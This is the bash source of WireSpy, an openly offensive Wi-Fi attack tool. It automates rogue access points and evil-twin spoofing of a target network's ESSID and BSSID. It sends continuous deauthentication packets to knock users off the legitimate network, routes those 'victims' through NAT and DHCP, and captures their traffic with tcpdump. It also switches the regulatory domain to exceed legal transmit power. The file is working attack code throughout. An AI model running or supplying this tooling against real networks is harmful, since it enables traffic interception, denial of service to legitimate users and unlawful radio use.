#!/usr/bin/env bash
#
#    Copyright (C) 2015 - 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# Possible improvement:
# * select the interface using the cursors rather than typing the name
# * add option set colors on/off

declare -r  PROGNAME=$(basename $0)
declare -r  PROGBASENAME=${PROGNAME%%.*}
declare -gr PROGVERSION=0.5
declare -gr BRANCH='master'

# BOLD='\e[1m'
# DIM='\e[2m'
# RESET_ALL='\e[0m'
# RESET_BOLD='\e[21m'
# RESET_FG='\e[39m'
# UNDERLINED='\e[4m'

# FG_BLACK='\e[30m'
# FG_CYAN='\e[36m'
# FG_GREEN='\e[32m'
# FG_YELLOW='\e[33m'
# FG_WHITE='\e[97m'

# BG_BLUE='\e[44m'
# BG_CYAN='\e[46m'
# BG_DARKGREY='\e[100m'
# BG_GREEN='\e[42m'
# BG_RED='\e[41m'
# BG_YELLOW='\e[43m'

declare -g  PROMPT_WIRESPY="$PROGBASENAME »"
declare -gr PROMPT_EVILTWIN="$PROGBASENAME > eviltwin »"
declare -gr PROMPT_HONEYPOT="$PROGBASENAME > honeypot »"
declare -gr PROMPT_POWERUP="$PROGBASENAME > powerup »"

isHoneypot=0
isEviltwin=0
isSniffing=0

INTF=''
MINTF=''
TINTF=''
WINTF=''

XTERM_AIRBASE_PID=''
AIRODUMP_PID=''
TCPDUMP_PID=''

declare -gr AIRBASE_ERROR='An error occurred with airbase-ng, no tap interface was created'
declare -gr AP_PREREQUISITE='To use this option, first configure a honeypot or an eviltwin'
declare -gr EVILTWIN_INFO="""This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets \
to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID, BSSID and wireless channel as the targeted access point.
To properly perform this attack the attacker should first scan all the in-range access points to select a \
target. Next step is to copy the BSSID, ESSID and channel of the selected target access point, to create its twin. 
The final step is to deauthenticate all the clients from the target access point, so that the victims may connect \
to the evil twin."""

declare -a INTERFACES
declare -a REQUIRED_PACKAGES=(
    'aircrack-ng'
    'git'
    'grep'
    'isc-dhcp-server'
    'macchanger'
    'procps'
    'rfkill'
    'iproute2'
    'iw'
    'tcpdump'
    'xterm'
)
declare -a WINTERFACES

trap quit INT

print()         { printf "%s » %s\n" "$PROGBASENAME" "$1"; }
print_error()   { printf "%s > error » %s\n" "$PROGBASENAME" "$1"; }
print_info()    { printf "%s > info » %s\n" "$PROGBASENAME" "$1"; }
print_intf()    { printf "%s > interface » %s\n" "$PROGBASENAME" "$1"; }
print_status()  { printf "%s > status » %s\n" "$PROGBASENAME" "$1"; }
print_warning() { printf "%s > warning » %s\n" "$PROGBASENAME" "$1"; }
print_hp()      { printf "%s > honeypot » %s\n" "$PROGBASENAME" "$1"; }
print_et()      { printf "%s > eviltwin » %s\n" "$PROGBASENAME" "$1"; }
print_pu()      { printf "%s > powerup » %s\n" "$PROGBASENAME" "$1"; }


function banner() {
cat <<- BANNER
${PROGBASENAME^^} v$PROGVERSION (type 'help' for a list of commands)
Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31

BANNER
}


function check_update() {
    print 'Checking for an update...'

    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]
    then
        if [[ $(git diff --name-only origin/$BRANCH -- ${0}) ]]
        then
            print 'A new version is available, consider updating using the command: git reset --hard && git pull origin $BRANCH --rebase'
        else
            print 'This is the latest stable version'
        fi
    else
        print_warning "It is recommended to fetch $0 on GitHub using the command: git clone https://github.com/AresS31/wirespy"
    fi
}



function check_compatibility() {
    local -i var=0
    
    print 'Bash version check...'
    if ((BASH_VERSINFO[0] < 4))
    then 
        var=1
        print_error "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
    else
        print 'The bash minimum version requirement is satisfied'
    fi

    print 'Dependencies check...'
    for package in ${REQUIRED_PACKAGES[@]}
    do
        if [[ -n $(dpkg -s $package 2> /dev/null) ]]
        then
            continue
        else
            var=1
            print_error "The $package package is missing. Install it with: sudo apt-get install $package -y"
        fi
    done

    if [[ $var = 1 ]]
    then
        exit 1
    fi

    print 'All of the required packages are already installed'
}

function usage {

cat <<- USAGE
Modules:
    eviltwin      > launch an evil-twin attack
    honeypot      > launch a rogue access point attack
    powerup       > power wireless interface up
    leases        > display DHCP leases
    start capture > start packet capture (tcpdump)
    stop capture  > stop packet capture (tcpdump)
Commands:
    status        > show modules status
    clear         > clear the terminal
    help          > list available commands
    quit          > exit the program
USAGE
}


function menu() {
    while :
    do
        PROMPT=$PROMPT_WIRESPY
        read -p  "$(echo -e $PROMPT) "

        case $REPLY in
            'status')
                local honeypot_status='not running'
                local eviltwin_status='not running'
                local tcpdump_status='not running'

                if [[ $isEviltwin = 1 ]]
                then
                    eviltwin_status='running'
                fi
                if [[ $isHoneypot = 1 ]]
                then
                    honeypot_status='running'
                fi
                if [[ $isSniffing = 1 ]]
                then
                    tcpdump_status='running'
                fi

cat <<- STATUS
Modules status:
    eviltwin       > $eviltwin_status
    honeypot       > $honeypot_status
    packet capture > $tcpdump_status
STATUS
                ;;
            'clear')
                clear
                ;;
            'quit')
                quit
                ;;
            'help')
                usage
                ;;
            'eviltwin')
                PROMPT=$PROMPT_EVILTWIN

                if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
                then
                    print_warning "An access-point (honeypot || evil-twin) is currently running. Do you wish to stop it to start an evil-twin attack?"
                    select option in 'yes' 'no' 'quit'
                    do
                        case $option in
                            'yes') 
                                print_info "Stopping the running attack..."
                                clean_up &> /dev/null
                                configure_intfs
                                eviltwin
                                isHoneypot=0
                                isEviltwin=1
                                break
                                ;;
                            'no')
                                break
                                ;;
                            'quit')
                                exit 0
                                ;;
                        esac
                    done
                else
                    configure_intfs
                    eviltwin
                    isEviltwin=1
                fi
                ;;
            'honeypot')
                PROMPT=$PROMPT_HONEYPOT

                if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
                then
                    print_warning "An access-point (honeypot || evil-twin) is currently running. Do you wish to stop it to start an evil-twin attack?"
                    select option in 'yes' 'no' 'quit'
                    do
                        case $option in
                            'yes') 
                                print_info "Stopping the running attack..."
                                clean_up &> /dev/null
                                configure_intfs
                                honeypot
                                isHoneypot=1
                                isEviltwin=0
                                break
                                ;;
                            'no')
                                break
                                ;;
                            'quit')
                                exit 0
                                ;;
                        esac
                    done
                else
                    configure_intfs
                    honeypot
                    isHoneypot=1
                fi
                ;;
            'powerup')
                PROMPT=$PROMPT_POWERUP
                powerup
                ;;
            'lease'|'leases')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $(cat /var/run/dhcpd.pid) ]]
                    then
                        cat /var/lib/dhcp/dhcpd.leases
                    else
                        print_warning 'The DHCP server has not been started'
                    fi
                fi
                ;;
            'start capture')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = 0 ]]
                    then
                        print_info "Packet capture started, the resulting file will be ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
                        TCPDUMP_PID=$(tcpdump -i $TINTF -w ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
                        isSniffing=1
                    else
                        print_warning 'The traffic is already being captured'
                    fi
                fi
                ;;
            'stop capture')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = 1 ]]
                    then
                        print_info "Packet capture stopped"
                        kill -SIGKILL "$TCPDUMP_PID"
                        isSniffing=0
                    else
                        print_warning 'No packet capture has been launched'
                    fi
                fi
                ;;
            *)
                print_warning "Invalid command: ${REPLY}. Type help for the list of available commands"
                ;;
        esac
    done
}


function configure_intfs() {
    local -r PS3="$(echo -e $PROMPT) "

    print 'Select the Internet-facing interface:'
    get_intfs
    select option in "${INTERFACES[@]}" 'quit'
    do
        case $option in
          'quit')
                exit 0
                ;;
            *)
                if [[ -n $option ]]
                then
                    INTF=$(echo "$option" | awk -F': ' '{print $1}')
                    break
                fi
                ;;
        esac
    done

    print "Do you wish to randomise $INTF MAC address (this option can cause problems)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_info "Randomising $INTF MAC address..."
                ip link set $INTF down && macchanger -A $INTF && ip link set $INTF up
                print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
                break
                ;;
            'no') 
                break
                ;;
            'quit')
                exit 0
                ;;
        esac
    done

    print 'Select the wireless interface to use:'
    get_wintfs
    select option in "${WINTERFACES[@]}" 'quit'
    do
        case $option in
            'quit')
                exit 0
                ;;
            *)
                if [[ -n $option ]]
                then
                    WINTF=$(echo "$option" | awk -F': ' '{print $1}')

                    if [[ $WINTF = $INTF ]]
                    then
                        print_warning "$WINTF is already in use, select another interface"
                    else
                        break
                    fi
                fi
                ;;
        esac
    done

    # prevent wlan adapter soft blocking
    rfkill unblock wifi

    # put the wireless interface into "monitor" mode
    # add a check to ensure monitor mode has started or exit the script
    print_info "Starting monitor mode on $WINTF..."
    iw dev $WINTF set type monitor
    sleep 2     # crucial to let WINTF come up before macchanging

    if [[ $? = 0 ]]
    then
        print_info "Monitor mode started"
    else
        print_error "$WINTF could not enter monitor mode, inspect this issue manually"
        exit 1
    fi
    MINTF=$WINTF

    print "Do you wish to randomise $MINTF MAC address (this option is recommended)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_info "Randomising $MINTF MAC address..."
                ip link set $MINTF down && macchanger -A $MINTF && ip link set $MINTF up
                break
                ;;
            'no')
                break
                ;;
            'quit')
                exit 0
                ;;
        esac
    done

    print_info "Killing processes that may interfere with the honeypot || evil-twin..."
    airmon-ng check kill
}


function honeypot() {
    local -ar options=(
        "Blackhole: The access point type will respond to all probe requests (the access point may receive a lot \
of requests in areas with high levels of WiFi activity such as crowded public places)." 
        'Bullzeye: The access point type will respond only to the probe requests specifying the access point ESSID.'
        )
    local -r PS3="$(echo -e $PROMPT) "


    print_hp 'Select the type of honeypot you want to set up:'
    select option in "${options[@]}"
    do
        case $REPLY in
            1) 
                local -ir attack_type=1
                break
                ;;
            2) 
                local -ir attack_type=2
                break
                ;;
        esac
    done

    print_hp 'Enter the honeypot ESSID:'
    read -p "$(echo -e $PROMPT) " ESSID

    print_hp 'Enter the honeypot wireless channel (value must be between 1 and 12):'
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        case $REPLY in 
            [1-9]|1[0-2])
                local -i WCHAN=$REPLY
                break
                ;;
            *) 
                print_warning "Invalid channel: $REPLY"
                ;;
        esac
    done

    print_hp 'Do you want to enable WEP authentication?'
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_hp 'Enter a WEP password (the value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 

                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                        XTERM_AIRBASE_PID=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                        XTERM_AIRBASE_PID=$!
                        ;;
                esac
                break
                ;;
            'no') 
                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                        XTERM_AIRBASE_PID=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
                        XTERM_AIRBASE_PID=$!
                        ;;  
                esac
                break
                ;;
            'quit')
                exit 0
                ;;
        esac
    done

    sleep 4     # crucial, to let TINTF come up before setting it up  

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
    if [[ $TINTF = '' ]]
    then
        print_error "$AIRBASE_ERROR"
        quit
    fi

    enable_internet
    
    print_info "The honeypot $ESSID is now running..."
    sleep 6
}


function eviltwin() {
    echo "$EVILTWIN_INFO"

    print_et 'Enter the evil-twin ESSID (the value must be identical to the legitimate access-point to spoof):'
    read -p "$(echo -e $PROMPT) " eviltwin_ESSID

    print_et 'Enter the evil-twin BSSID (the value must be identical to the legitimate access-point to spoof):'
    read -p "$(echo -e $PROMPT) " eviltwin_BSSID

    print_et 'Enter the wireless channel to use (the value must be identical to the legitimate access-point to spoof):'
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        case $REPLY in 
            [1-9]|1[0-2])
                local -i WCHAN=$REPLY
                break
                ;;
            *) 
                print_warning "Invalid channel: $REPLY"
                ;;
        esac
    done

    xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF -v | tee ./conf/tmp.txt 2> /dev/null" &
    XTERM_AIRBASE_PID=$!
    sleep 4     # crucial to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')
    if [[ $TINTF = '' ]]
    then
        print_error "$AIRBASE_ERROR"
        quit
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID -e eviltwin_ESSID $MINTF" &
    XTERM_AIREPLAY_PID=$!
    sleep 4

    enable_internet
    
    print_info "The eviltwin $eviltwin_ESSID is now running..."
    sleep 6
}


function powerup() {
    local PS3="$(echo -e $PROMPT) "

    print_pu 'Select the wireless interface to boost-up:'
    get_wintfs
    select option in "${WINTERFACES[@]}"
    do
        case $option in
            'quit')
                exit 0
                ;;
            *)
                if [[ -n $option ]]
                then
                    local WINTF=$(echo "$option" | awk -F': ' '{print $1}')
                    break
                fi
                ;;
        esac
    done

    print_pu "Enter the power boost (the value must be up to to 4000) to apply to ${WINTF}:"
    while :
    do
        read -p  "$(echo -e $PROMPT_POWERUP) "
        
        if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]
        then
            local -i BOOST=$REPLY
            break
        else
            print_warning "Invalid value: $REPLY"
        fi
    done

    print_info "$WINTF powering up..."
    # Bolivia allows high power levels
    ip link set $WINTF down && iw reg set BO && iw dev $WINTF set txpower fixed $BOOST && ip link set $WINTF up
    sleep 4
    iw dev $WINTF info
}


function get_intfs() {
    intfs=$(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo')

    if [[ $intfs ]]
    then
        INTERFACES=()

        for intf in $intfs
        do # get the network interfaces names
            IP=$(ip -o -f inet add show "$intf" | awk '{print $4}')
            MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
            INTERFACES+=("${intf}: $IP $MAC")
        done
    else
        print_error 'No networking interface detected'
        exit 1
    fi
}


function get_wintfs() {
    wintfs=$(ip -o link show | awk -F': ' '{print $2}' | grep 'wlan')

    if [[ $wintfs ]]
    then
        WINTERFACES=()

        for wintf in $wintfs
        do # get the interfaces names
            IP=$(ip -o -f inet add show "$wintf" | awk '{print $4}')
            MAC=$(ip link show "$wintf" | awk '/ether/ {print $2}')
            WINTERFACES+=("${wintf}: $IP $MAC")
        done
    else
        print_error 'No wireless interface detected'
        exit 1
    fi
}


function enable_internet() {
    # configuring the newly created tap intrface
    ip addr flush dev $TINTF
    ip link set $TINTF down && ip addr add 10.0.0.254/24 dev $TINTF && ip link set $TINTF up
    ip route flush dev $TINTF
    ip route add 10.0.0.0/24 via 10.0.0.254 dev $TINTF

    print_info 'Enabling IP forwarding'
    echo 1 > /proc/sys/net/ipv4/ip_forward
    # setting up ip address and route

    print_info 'Configuring NAT iptables...'
    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o $INTF -j MASQUERADE

    # reset any pre-existing dhcp leases
    print_info 'Resetting pre-existing DHCP leases'
    cat /dev/null > /var/lib/dhcp/dhcpd.leases
    cat /dev/null > /tmp/dhcpd.conf

    # copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    print_info 'Backing up /etc/dhcp/dhcpd.conf, /etc/default/isc-dhcp-server and importing the new configurations'
    cp --backup ./conf/dhcpd.conf /etc/dhcp/dhcpd.conf
    sed -i.bak -e "s/INTERFACESv4=.*/INTERFACESv4=\"${TINTF}\"/" /etc/default/isc-dhcp-server

    # starting the DHCP service
    print_info 'Starting DHCP server to provide the victims with internet access...'
    /etc/init.d/isc-dhcp-server start 
    sleep 4
}


function clean_up() {
    if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
    then
        print_info "Terminating active processes..."
        if [[ $XTERM_AIRBASE_PID ]]
        then
            kill -SIGKILL $XTERM_AIRBASE_PID 
        fi
        if [[ $XTERM_AIREPLAY_PID ]]
        then
            kill -SIGKILL $XTERM_AIREPLAY_PID
        fi
        sleep 2
    
        print_info "Removing temporary files"
        rm -f ./conf/tmp.txt

        print_info 'Disabling IP forwarding'
        echo 0 > /proc/sys/net/ipv4/ip_forward

        print_info 'Flushing iptables'
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain

        print_info 'Restoring /etc/dhcp/dhcpd.conf and /etc/default/isc-dhcp-server original configurations'
        mv /etc/dhcp/dhcpd.conf~ /etc/dhcp/dhcpd.conf
        mv /etc/default/isc-dhcp-server.bak /etc/default/isc-dhcp-server

        print_info 'Stopping DHCP server...'
        /etc/init.d/isc-dhcp-server stop
    fi
    if [[ $MINTF != '' ]]
    then
        print_info "Starting managed mode on $MINTF..." 
        iw dev $MINTF set type managed
        sleep 2

        if [[ $? = 0 ]]
        then
            print_info "Managed mode started"
        else
            print_error "$MINTF could not enter managed mode, inspect this issue manually"
        fi
    fi
    if [[ $isSniffing = 1 ]]
    then
        print_info "Terminating TCPDump..."
        kill -SIGKILL $TCPDUMP_PID
        sleep 4
    fi
}


function quit() {
    clean_up
    exit 130
}


# ensure that the script is running with root privileges
# this step is necessary since WireSpy needs to be perform network changes
if [[ $EUID -ne 0 ]]
then
    print_error "You must run this script as as root using the command: sudo bash ${0}"
    exit 1
fi


banner
check_update
check_compatibility
menu
